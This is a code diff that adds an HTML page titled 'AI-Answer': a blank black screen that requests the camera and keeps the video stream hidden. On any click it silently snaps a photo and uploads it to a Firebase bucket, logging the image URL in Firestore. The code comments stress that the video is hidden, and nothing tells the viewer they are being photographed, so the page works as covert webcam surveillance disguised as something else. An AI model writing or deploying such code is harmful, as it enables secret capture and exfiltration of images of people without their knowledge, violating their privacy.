@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI-Answer</title>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #status {
+      margin-top: 10px;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <p id="status"></p>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+
+  <script>
+    // Firebase Configuration (Insert your actual Firebase config here)
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",  // Replace with your API key
+      authDomain: "YOUR_PROJECT.firebaseapp.com",  // Replace with your authDomain
+      projectId: "YOUR_PROJECT_ID",  // Replace with your projectId
+      storageBucket: "YOUR_PROJECT.appspot.com",  // Replace with your storageBucket
+      messagingSenderId: "YOUR_MSG_ID",  // Replace with your messagingSenderId
+      appId: "YOUR_APP_ID"  // Replace with your appId
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const storage = firebase.storage();
+    const db = firebase.firestore();
+
+    const canvas = document.createElement('canvas');
+    const video = document.createElement('video');
+    document.body.appendChild(video);  // Video is invisible, it just captures
+    const status = document.getElementById('status');
+
+    // Set up video stream but keep it hidden
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        video.style.display = 'none';  // Hide video
+        video.play();
+      })
+      .catch(err => {
+        status.innerText = 'Camera Error: ' + err;
+      });
+
+    // Capture photo when screen is clicked
+    document.body.addEventListener('click', async () => {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+
+      const filename = `image_${Date.now()}.jpg`;
+      const ref = storage.ref().child('images/' + filename);
+
+      // Upload image to Firebase Storage
+      await ref.put(blob);
+      const url = await ref.getDownloadURL();
+
+      status.innerText = 'Image Uploaded!';
+
+      // Save image URL to Firestore
+      await db.collection("images").add({
+        url,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      });
+    });
+
+  </script>
+</body>
+</html>
